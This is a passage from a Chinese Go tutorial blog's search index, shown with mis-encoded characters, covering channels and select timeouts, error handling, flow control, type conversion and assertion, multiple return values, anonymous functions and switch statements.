å…ˆåˆå§‹åŒ–ä¸¤ä¸ª channel c1 å’Œ c2ï¼Œç„¶åå¼€å¯ä¸¤ä¸ª goroutine åˆ†åˆ«å¾€ c1 å’Œ c2 å†™å…¥æ•°æ®ï¼Œå†é€šè¿‡ select ç›‘å¬ä¸¤ä¸ª channelï¼Œä»ä¸­è¯»å–æ•°æ®å¹¶è¾“å‡ºã€‚ è¿è¡Œç»“æœå¦‚ä¸‹ï¼š 123$ go run channel.goreceived onereceived two è¶…æ—¶æœºåˆ¶ é€šè¿‡å‰é¢çš„å†…å®¹æˆ‘ä»¬äº†è§£åˆ°ï¼Œchannel çš„è¯»å†™æ“ä½œéå¸¸ç®€å•ï¼Œåªéœ€è¦é€šè¿‡ &lt;- æ“ä½œç¬¦å³å¯å®ç°ï¼Œä½†æ˜¯ channel çš„ä½¿ç”¨ä¸å½“å´ä¼šå¸¦æ¥å¤§éº»çƒ¦ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¹‹å‰çš„ä¸€æ®µä»£ç ï¼š 123a := make(chan int)a &lt;- 1z := &lt;-a è§‚å¯Ÿä¸Šé¢ä¸‰è¡Œä»£ç ï¼Œç¬¬ 2 è¡Œå¾€ channel å†…å†™å…¥äº†æ•°æ®ï¼Œç¬¬ 3 è¡Œä» channel ä¸­è¯»å–äº†æ•°æ®ï¼Œå¦‚æœç¨‹åºè¿è¡Œæ­£å¸¸å½“ç„¶ä¸ä¼šå‡ºä»€ä¹ˆé—®é¢˜ï¼Œå¯å¦‚æœç¬¬äºŒè¡Œæ•°æ®å†™å…¥å¤±è´¥ï¼Œæˆ–è€… channel ä¸­æ²¡æœ‰æ•°æ®ï¼Œé‚£ä¹ˆç¬¬ 3 è¡Œä»£ç ä¼šå› ä¸ºæ°¸è¿œæ— æ³•ä» a ä¸­è¯»å–åˆ°æ•°æ®è€Œä¸€ç›´å¤„äºé˜»å¡çŠ¶æ€ã€‚ç›¸åçš„ï¼Œå¦‚æœ channel ä¸­çš„æ•°æ®ä¸€ç›´æ²¡æœ‰è¢«è¯»å–ï¼Œé‚£ä¹ˆå†™å…¥æ“ä½œä¹Ÿä¼šä¸€ç›´å¤„äºé˜»å¡çŠ¶æ€ã€‚å¦‚æœä¸æ­£ç¡®å¤„ç†è¿™ä¸ªæƒ…å†µï¼Œå¾ˆå¯èƒ½ä¼šå¯¼è‡´æ•´ä¸ª goroutine é”æ­»ï¼Œè¿™å°±æ˜¯è¶…æ—¶é—®é¢˜ã€‚Go è¯­è¨€æ²¡æœ‰é’ˆå¯¹è¶…æ—¶æä¾›ä¸“é—¨çš„å¤„ç†æœºåˆ¶ï¼Œä½†æ˜¯æˆ‘ä»¬å´å¯ä»¥åˆ©ç”¨ select æ¥å·§å¦™åœ°å®ç°è¶…æ—¶å¤„ç†æœºåˆ¶ï¼Œä¸‹é¢çœ‹ä¸€ä¸ªç¤ºä¾‹ï¼š 1234567891011t := make(chan bool)go func &#123; time.Sleep(1e9) //ç­‰å¾…1ç§’ t &lt;- true&#125;select &#123; case &lt;-ch: //ä»chä¸­è¯»å–æ•°æ® case &lt;-t: //å¦‚æœ1ç§’åæ²¡æœ‰ä»chä¸­è¯»å–åˆ°æ•°æ®ï¼Œé‚£ä¹ˆä»tä¸­è¯»å–ï¼Œå¹¶è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œ&#125; è¿™æ ·çš„æ–¹æ³•å°±å¯ä»¥è®©ç¨‹åºåœ¨ç­‰å¾… 1 ç§’åç»§ç»­æ‰§è¡Œï¼Œè€Œä¸ä¼šå› ä¸º ch è¯»å–ç­‰å¾…è€Œå¯¼è‡´ç¨‹åºåœæ»ï¼Œä»è€Œå·§å¦™åœ°å®ç°äº†è¶…æ—¶å¤„ç†æœºåˆ¶ï¼Œè¿™ç§æ–¹æ³•ä¸ä»…ç®€å•ï¼Œåœ¨å®é™…é¡¹ç›®å¼€å‘ä¸­ä¹Ÿæ˜¯éå¸¸å®ç”¨çš„ã€‚ channel çš„å…³é—­ channel çš„å…³é—­éå¸¸ç®€å•ï¼Œä½¿ç”¨ Go è¯­è¨€å†…ç½®çš„ close() å‡½æ•°å³å¯å…³é—­ channelï¼Œç¤ºä¾‹ï¼š 12ch := make(chan int)close(ch) å…³é—­äº† channel åå¦‚ä½•æŸ¥çœ‹ channel æ˜¯å¦å…³é—­æˆåŠŸäº†å‘¢ï¼Ÿå¾ˆç®€å•ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¯»å– channel æ—¶é‡‡ç”¨å¤šé‡è¿”å›å€¼çš„æ–¹å¼ï¼Œç¤ºä¾‹ï¼š 1x, ok := &lt;-ch é€šè¿‡æŸ¥çœ‹ç¬¬äºŒä¸ªè¿”å›å€¼çš„ bool å€¼å³å¯åˆ¤æ–­ channel æ˜¯å¦å…³é—­ï¼Œè‹¥ä¸º false åˆ™è¡¨ç¤º channel è¢«å…³é—­ï¼Œåä¹‹åˆ™æ²¡æœ‰å…³é—­ã€‚","tags":[{"name":"Code/Go","slug":"Code-Go","permalink":"https://hodlyounger.github.io/tags/Code-Go/"},{"name":"Go","slug":"Go","permalink":"https://hodlyounger.github.io/tags/Go/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"æ‰‹å†Œ/Goç®€æ˜æ‰‹å†Œ","slug":"æ‰‹å†Œ-Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C-Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"å¹¶å‘ä¸å¹¶è¡Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/å¹¶å‘ä¸å¹¶è¡Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/"}]},{"title":"Goç®€æ˜æ‰‹å†Œæ¦‚è¦","date":"2023-10-27T01:24:02.153Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/Goç®€æ˜æ‰‹å†Œ/","text":"Goè¯­è¨€åŸºç¡€ Goè¯­è¨€ä»‹ç» Goè¯­è¨€é¡ºåºç¼–ç¨‹ å¹¶å‘ä¸å¹¶è¡Œ è¯é¢‘ç»Ÿè®¡ç»¼åˆæ¡ˆä¾‹ é¢å‘å¯¹è±¡ç¼–ç¨‹","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}]},{"title":"ã€Goç®€æ˜æ‰‹å†Œã€‘é”™è¯¯å¤„ç†","date":"2023-10-27T01:24:02.152Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹/é”™è¯¯å¤„ç†/ã€Goç®€æ˜æ‰‹å†Œã€‘é”™è¯¯å¤„ç†/","text":"é”™è¯¯å¤„ç†* é”™è¯¯å¤„ç†æ˜¯ä»»ä½•è¯­è¨€éƒ½éœ€è¦è€ƒè™‘åˆ°çš„é—®é¢˜ï¼Œè€Œ Go è¯­è¨€åœ¨é”™è¯¯å¤„ç†ä¸Šè§£å†³å¾—æ›´ä¸ºå®Œå–„ï¼Œä¼˜é›…çš„é”™è¯¯å¤„ç†æœºåˆ¶æ˜¯ Go è¯­è¨€çš„ä¸€å¤§ç‰¹ç‚¹ã€‚ error Go è¯­è¨€å¼•å…¥äº†ä¸€ä¸ªé”™è¯¯å¤„ç†çš„æ ‡å‡†æ¨¡å¼ï¼Œå³ error æ¥å£ï¼Œè¯¥æ¥å£å®šä¹‰å¦‚ä¸‹ï¼š 123type error interface &#123; Error() string&#125; å¯¹äºå¤§å¤šæ•°å‡½æ•°ï¼Œå¦‚æœè¦è¿”å›é”™è¯¯ï¼Œå¯ä»¥å°† error ä½œä¸ºå¤šè¿”å›å€¼çš„æœ€åä¸€ä¸ªï¼š 1234func foo(param int)(ret int, err error)&#123; ...&#125; è°ƒç”¨æ—¶çš„ä»£ç ï¼š 123456n, err := foo(0)if err != nil &#123; // é”™è¯¯å¤„ç†&#125; else &#123; // ä½¿ç”¨è¿”å›å€¼n&#125; æˆ‘ä»¬è¿˜å¯ä»¥è‡ªå®šä¹‰é”™è¯¯ç±»å‹ï¼Œåˆ›å»ºæºæ–‡ä»¶ error.goï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435package mainimport &quot;fmt&quot;import &quot;errors&quot;//è‡ªå®šä¹‰çš„å‡ºé”™ç»“æ„type myError struct &#123; arg int errMsg string&#125;//å®ç°Erroræ¥å£func (e *myError) Error() string &#123; return fmt.Sprintf(&quot;%d - %s&quot;, e.arg, e.errMsg)&#125;//ä¸¤ç§å‡ºé”™func error_test(arg int) (int, error) &#123; if arg &lt; 0 &#123; return -1, errors.New(&quot;Bad Arguments - negtive!&quot;) &#125;else if arg &gt;256 &#123; return -1, &amp;myError&#123;arg, &quot;Bad Arguments - too large!&quot;&#125; &#125; return arg*arg, nil&#125;//ç›¸å…³çš„æµ‹è¯•func main() &#123; for _, i := range []int&#123;-1, 4, 1000&#125; &#123; if r, e := error_test(i); e != nil &#123; fmt.Println(&quot;failed:&quot;, e) &#125; else &#123; fmt.Println(&quot;success:&quot;, r) &#125; &#125;&#125;","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Goè¯­è¨€é¡ºåºç¼–ç¨‹","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/"},{"name":"é”™è¯¯å¤„ç†","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹/é”™è¯¯å¤„ç†","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/"}]},{"title":"ã€Goç®€æ˜æ‰‹å†Œã€‘Goé¡ºåºç¼–ç¨‹--æµç¨‹æ§åˆ¶","date":"2023-10-27T01:24:02.146Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹/æµç¨‹æ§åˆ¶/ã€Goç®€æ˜æ‰‹å†Œã€‘Goé¡ºåºç¼–ç¨‹--æµç¨‹æ§åˆ¶/","text":"[toc] Go è¯­è¨€æä¾›çš„æµç¨‹æ§åˆ¶è¯­å¥åŒ…æ‹¬ ifã€switchã€forã€gotoã€selectï¼Œå…¶ä¸­ select ç”¨äºç›‘å¬ channelï¼ˆé€šé“ï¼‰åœ¨è®²è§£é€šé“çš„æ—¶å€™å†è¯¦ç»†ä»‹ç»ã€‚ if è¯­å¥ è¯­æ³•ï¼š 1234567if optionalStatement1; booleanExpression1 &#123; block1&#125; else if optionalStatement2; booleanExpression2 &#123; block2&#125; else &#123; block3&#125; å…¶ä¸­ optionalStatement æ˜¯å¯é€‰çš„è¡¨è¾¾å¼ï¼ŒçœŸæ­£å†³å®šåˆ†æ”¯èµ°å‘çš„æ˜¯ booleanExpression1 çš„å€¼ã€‚ for è¯­å¥ Go è¯­è¨€çš„ for è¯­å¥å¯ä»¥éå†æ•°ç»„ï¼Œåˆ‡ç‰‡ï¼Œæ˜ å°„ç­‰ç±»å‹ï¼Œä¹Ÿå¯ä»¥ç”¨äºæ— é™å¾ªç¯ã€‚ä»¥ä¸‹æ˜¯å…¶è¯­æ³•ï¼š 123456789101112131415for &#123; // æ— é™å¾ªç¯ block&#125;for booleanExpression &#123; // whileå¾ªç¯ï¼Œåœ¨Goè¯­è¨€ä¸­æ²¡æœ‰whileå…³é”®å­—&#125;for index, char := range aString &#123; // è¿­ä»£å­—ç¬¦ä¸²&#125;for item := range aChannel &#123; // è¿­ä»£é€šé“&#125; è·³è½¬è¯­å¥ Go è¯­è¨€ä¸­ä½¿ç”¨ goto å…³é”®å­—å®ç°è·³è½¬ã€‚goto è¯­å¥çš„è¯­ä¹‰éå¸¸ç®€å•ï¼Œå°±æ˜¯è·³è½¬åˆ°æœ¬å‡½æ•°å†…çš„æŸä¸ªæ ‡ç­¾ï¼Œä¾‹å¦‚ï¼š 123456789func myfunc()&#123; i := 0 THIS: //å®šä¹‰ä¸€ä¸ªTHISæ ‡ç­¾ fmt.Println(i) i++ if i &lt; 1 &#123; goto THIS //è·³è½¬åˆ°THISæ ‡ç­¾ &#125;&#125;","tags":[{"name":"Code/Go","slug":"Code-Go","permalink":"https://hodlyounger.github.io/tags/Code-Go/"},{"name":"Go","slug":"Go","permalink":"https://hodlyounger.github.io/tags/Go/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Goè¯­è¨€é¡ºåºç¼–ç¨‹","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/"},{"name":"æµç¨‹æ§åˆ¶","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹/æµç¨‹æ§åˆ¶","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/"}]},{"title":"Goé¡ºåºç¼–ç¨‹â€”â€”ç±»å‹è½¬æ¢","date":"2023-10-27T01:24:02.146Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹/ç±»å‹è½¬æ¢/ã€Goç®€æ˜æ‰‹å†Œã€‘Goé¡ºåºç¼–ç¨‹--ç±»å‹è½¬æ¢/","text":"[toc] ç±»å‹è½¬æ¢ Go è¯­è¨€æä¾›äº†ä¸€ç§åœ¨ä¸åŒä½†ç›¸äº’å…¼å®¹çš„ç±»å‹ä¹‹é—´ç›¸äº’è½¬æ¢çš„æ–¹å¼ï¼Œè¿™ç§è½¬æ¢éå¸¸æœ‰ç”¨å¹¶ä¸”æ˜¯å®‰å…¨çš„ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯åœ¨æ•°å€¼ä¹‹é—´è¿›è¡Œè½¬æ¢å¯èƒ½é€ æˆå…¶ä»–é—®é¢˜ï¼Œå¦‚ç²¾åº¦ä¸¢å¤±æˆ–è€…é”™è¯¯çš„ç»“æœã€‚ä»¥ä¸‹æ˜¯ç±»å‹è½¬æ¢çš„è¯­æ³•ï¼š resultOfType := Type(expression) å‡ ä¸ªä¾‹å­ï¼š 1234x := int16(2345) // å£°æ˜ä¸€ä¸ªç±»å‹ä¸ºint16çš„æ•´æ•°ï¼Œå…¶å€¼ä¸º2345y := int32(x) // å°†int16ç±»å‹çš„æ•´æ•°è½¬æ¢ä¸ºint32ç±»å‹a := uint16(65000) // å£°æ˜ä¸€ä¸ªç±»å‹ä¸ºuint16ç±»å‹çš„æ•´æ•°b := int16(a) // è½¬æ¢ä¸ºint16ç±»å‹ï¼Œè™½ç„¶èƒ½è½¬æ¢æˆåŠŸï¼Œä½†æ˜¯ç”±äº65000è¶…è¿‡in16ç±»å‹çš„èŒƒå›´ï¼Œä¼šå¯¼è‡´ç»“æœé”™è¯¯ï¼Œbçš„å€¼ä¸º -536 å¦å¤–åœ¨ Go è¯­è¨€ä¸­å¯ä»¥é€šè¿‡ type å…³é”®å­—å£°æ˜ç±»å‹ï¼Œå¦‚ type StringsSlice []string å°† []stringï¼ˆstring ç±»å‹çš„åˆ‡ç‰‡ï¼‰å£°æ˜ä¸º StringSlice ç±»å‹ã€‚ ç±»å‹æ–­è¨€ è¯´åˆ°ç±»å‹æ–­è¨€å°±éœ€è¦å…ˆäº†è§£ä¸‹ Go è¯­è¨€ä¸­çš„æ¥å£ã€‚åœ¨ Go è¯­è¨€ä¸­æ¥å£æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰ç±»å‹ã€‚å®ƒå£°æ˜äº†ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ–¹æ³•ã€‚ä»»ä½•å®ç°äº†è¿™äº›æ–¹æ³•çš„å¯¹è±¡ï¼ˆç±»å‹ï¼‰éƒ½æ»¡è¶³è¿™ä¸ªæ¥å£ã€‚ æ¥å£æ˜¯å®Œå…¨æŠ½è±¡çš„ï¼Œä¸èƒ½å®ä¾‹åŒ–ã€‚interface&#123;&#125; ç±»å‹è¡¨ç¤ºä¸€ä¸ªç©ºæ¥å£ï¼Œä»»ä½•ç±»å‹éƒ½æ»¡è¶³ç©ºæ¥å£ã€‚ä¹Ÿå°±æ˜¯è¯´ interface&#123;&#125; ç±»å‹çš„å€¼å¯ä»¥ç”¨äºè¡¨ç¤ºä»»æ„ Go è¯­è¨€ç±»å‹çš„å€¼ã€‚ è¿™é‡Œçš„ç©ºæ¥å£æœ‰ç‚¹ç±»ä¼¼äº Python è¯­è¨€ä¸­çš„ object å®ä¾‹ã€‚æ—¢ç„¶ interface&#123;&#125; å¯ä»¥ç”¨äºè¡¨ç¤ºä»»æ„ç±»å‹ï¼Œé‚£æœ‰çš„æ—¶å€™æˆ‘ä»¬éœ€è¦å°† interface&#123;&#125; ç±»å‹è½¬æ¢ä¸ºæˆ‘ä»¬éœ€è¦çš„ç±»å‹ï¼Œè¿™ä¸ªæ“ä½œç§°ä¸ºç±»å‹æ–­è¨€ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹åªæœ‰æˆ‘ä»¬å¸Œæœ›è¡¨è¾¾å¼æ˜¯æŸç§ç‰¹å®šç±»å‹çš„å€¼æ—¶æ‰ä½¿ç”¨ç±»å‹æ–­è¨€ã€‚Go è¯­è¨€ä¸­å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯­æ³•ï¼š resultOfType, boolean := expression.(Type)ï¼šå®‰å…¨çš„ç±»å‹æ–­è¨€ã€‚ resultOfType := expression.(Type)ï¼šéå®‰å…¨çš„ç±»å‹æ–­è¨€ï¼Œå¤±è´¥æ—¶ç¨‹åºä¼šäº§ç”Ÿå¼‚å¸¸ã€‚ åˆ›å»ºæºæ–‡ä»¶ type_t.goï¼Œè¾“å…¥ä»¥ä¸‹æºæ–‡ä»¶ï¼š 123456789101112131415161718192021package mainimport ( &quot;fmt&quot;)func main() &#123; x := uint16(65000) y := int16(x) // å°† xè½¬æ¢ä¸ºint16ç±»å‹ fmt.Printf(&quot;type and value of x is: %T and %d\\n&quot;, x, x) // %T æ ¼å¼åŒ–æŒ‡ä»¤çš„ä½œç”¨æ˜¯è¾“å‡ºå˜é‡çš„ç±»å‹ fmt.Printf(&quot;type and value of y is: %T and %d\\n&quot;, y, y) var i interface&#123;&#125; = 99 // åˆ›å»ºä¸€ä¸ªinterface&#123;&#125;ç±»å‹ï¼Œå…¶å€¼ä¸º99 var s interface&#123;&#125; = []string&#123;&quot;left&quot;, &quot;right&quot;&#125; j := i.(int) // æˆ‘ä»¬å‡è®¾iæ˜¯å…¼å®¹intç±»å‹ï¼Œå¹¶ä½¿ç”¨ç±»å‹æ–­è¨€å°†å…¶è½¬æ¢ä¸ºintç±»å‹ fmt.Printf(&quot;type and value of j is: %T and %d\\n&quot;, j, j) if s, ok := s.([]string); ok &#123; // åˆ›å»ºäº†å½±å­å˜é‡ï¼Œifçš„ä½œç”¨åŸŸä¸­è¦†ç›–äº†å¤–éƒ¨çš„å˜é‡s fmt.Printf(&quot;%T -&gt; %q\\n&quot;, s, s) &#125;&#125; è¿è¡Œç¨‹åºï¼š 12345$ go run type_t.gotype and value of x is: uint16 and 65000type and value of y is: int16 and -536type and value of j is: int and 99[]string -&gt; [&quot;left&quot; &quot;right&quot;]","tags":[{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Goè¯­è¨€é¡ºåºç¼–ç¨‹","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/"},{"name":"ç±»å‹è½¬æ¢","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹/ç±»å‹è½¬æ¢","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/"}]},{"title":"Goé¡ºåºç¼–ç¨‹â€”â€”å‡½æ•°çš„å¤šè¿”å›å€¼","date":"2023-10-27T01:24:02.144Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹/å‡½æ•°çš„å¤šè¿”å›å€¼/ã€Goç®€æ˜æ‰‹å†Œã€‘Goé¡ºåºç¼–ç¨‹--å‡½æ•°çš„å¤šè¿”å›å€¼/","text":"æ¦‚è¿°ï¼š Golang å‡½æ•°å¦‚ä½•è¿”å›å¤šä¸ªå˜é‡ ä¸ C/C++ å’Œ JAVA ä¸åŒï¼ŒGo è¯­è¨€çš„å‡½æ•°å’Œæ–¹æ³•å¯ä»¥æœ‰å¤šä¸ªè¿”å›å€¼ï¼Œè¿™æ˜¯ Go æä¾›çš„ä¸€ä¸ªä¼˜ç¾çš„ç‰¹æ€§ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š 12345678910package Divideimport &quot;errors&quot;func divide (a int, b int) (num int, err error)&#123; //å®šä¹‰ä¸¤ä¸ªè¿”å›å€¼ if b == 0 &#123; err = errors.New(&quot;è¢«é™¤æ•°ä¸èƒ½ä¸ºé›¶ï¼&quot;) return &#125; return a / b, nil //æ”¯æŒå¤šä¸ªè¿”å›å€¼&#125; åŒ¿åå‡½æ•° åœ¨ Go è¯­è¨€ä¸­ï¼Œä½ å¯ä»¥åœ¨ä»£ç é‡Œéšæ—¶å®šä¹‰åŒ¿åå‡½æ•°ï¼ŒåŒ¿åå‡½æ•°ç”±ä¸€ä¸ªä¸å¸¦å‡½æ•°åçš„å‡½æ•°å£°æ˜å’Œå‡½æ•°ä½“ç»„æˆï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š 123func (a, b, c int) bool &#123; return a * b &lt; c&#125; ä½ å¯ä»¥å°†åŒ¿åå‡½æ•°ç›´æ¥èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼Œä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨è¿è¡Œï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š 1234567x := func (a, b, c int) bool &#123; return a * b &lt; c&#125;func (a, b, c int) bool &#123; return a * b &lt; c&#125; (1, 2, 3) //å°æ‹¬å·å†…ç›´æ¥ç»™å‚æ•°åˆ—è¡¨è¡¨ç¤ºå‡½æ•°è°ƒç”¨","tags":[{"name":"Code/Go","slug":"Code-Go","permalink":"https://hodlyounger.github.io/tags/Code-Go/"},{"name":"Go","slug":"Go","permalink":"https://hodlyounger.github.io/tags/Go/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Goè¯­è¨€é¡ºåºç¼–ç¨‹","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/"},{"name":"å‡½æ•°çš„å¤šè¿”å›å€¼","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹/å‡½æ•°çš„å¤šè¿”å›å€¼","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/%E5%87%BD%E6%95%B0%E7%9A%84%E5%A4%9A%E8%BF%94%E5%9B%9E%E5%80%BC/"}]},{"title":"Goé¡ºåºç¼–ç¨‹â€”â€”switchè¯­å¥","date":"2023-10-27T01:24:02.141Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹/switchè¯­å¥/ã€Goé¡ºåºç¼–ç¨‹ã€‘README/","text":"Go è¯­è¨€ä¸­ switch åˆ†æ”¯æ—¢å¯ç”¨äºå¸¸ç”¨çš„åˆ†æ”¯å°±åƒ C è¯­è¨€ä¸­çš„ switch ä¸€æ ·ï¼Œä¹Ÿå¯ä»¥ç”¨äºç±»å‹å¼€å…³ï¼Œæ‰€è°“ç±»å‹å¼€å…³å°±æ˜¯ç”¨äºåˆ¤æ–­å˜é‡å±äºä»€ä¹ˆç±»å‹ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ Go è¯­è¨€çš„ switch è¯­å¥ä¸ä¼šè‡ªåŠ¨è´¯ç©¿ï¼Œç›¸åï¼Œå¦‚æœæƒ³è¦è´¯ç©¿éœ€è¦æ·»åŠ  fallthrough è¯­å¥ã€‚è¡¨è¾¾å¼å¼€å…³ switch çš„è¯­æ³•å¦‚ä¸‹ï¼š 123456switch optionalStatement; optionalExpression &#123; case expression1: block1 ... case expressionN: blockN default: blockD&#125; ä¸‹é¢æ˜¯ä¸ªä¾‹å­ï¼š 12345678switch &#123; // æ²¡æœ‰è¡¨è¾¾å¼ï¼Œé»˜è®¤ä¸ºTrueå€¼ï¼ŒåŒ¹é…åˆ†æ”¯ä¸­å€¼ä¸ºTrueçš„åˆ†æ”¯ case value &lt; minimum: return minimum case value &gt; maximum: return 